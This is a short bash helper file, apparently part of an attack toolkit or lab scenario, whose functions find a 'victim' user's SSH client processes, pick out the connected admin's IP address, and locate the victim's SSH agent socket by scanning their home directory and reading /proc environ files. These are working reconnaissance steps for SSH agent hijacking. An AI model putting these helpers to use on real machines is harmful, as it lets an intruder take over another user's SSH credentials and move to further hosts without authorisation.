#!/usr/bin/env bash
# Shared helpers (source from other scripts).
ssh_client_pids() {
  local port="${SSH_SERVER_PORT:-22}"
  local user="${VICTIM_USER:-legacy}"
  if [[ "$port" == "22" ]]; then
    ps -eo pid=,cmd= | grep -E "[s]sh .*${user}@" | awk '{print $1}'
  else
    ps -eo pid=,cmd= | grep -E "[s]sh .*(-p |:)${port}.*${user}@" | awk '{print $1}'
  fi
}

admin_ip_from_ss() {
  local port="${SSH_SERVER_PORT:-22}"
  ss -tnH state established "( sport = :${port} )" \
    | awk '{print $4}' | sed 's/:.*//' | head -1
}

find_agent_sock() {
  local user="${VICTIM_USER:-legacy}"
  local s sock
  shopt -s nullglob
  for s in /home/"${user}"/.ssh/agent/*; do
    [[ -S "$s" ]] && { echo "$s"; return 0; }
  done
  shopt -u nullglob
  local pid
  for pid in $(pgrep -u "$user" 2>/dev/null); do
    sock=$(tr '\0' '\n' < "/proc/$pid/environ" 2>/dev/null | sed -n 's/^SSH_AUTH_SOCK=//p' | head -1)
    [[ -n "$sock" && -S "$sock" ]] && { echo "$sock"; return 0; }
  done
  return 1
}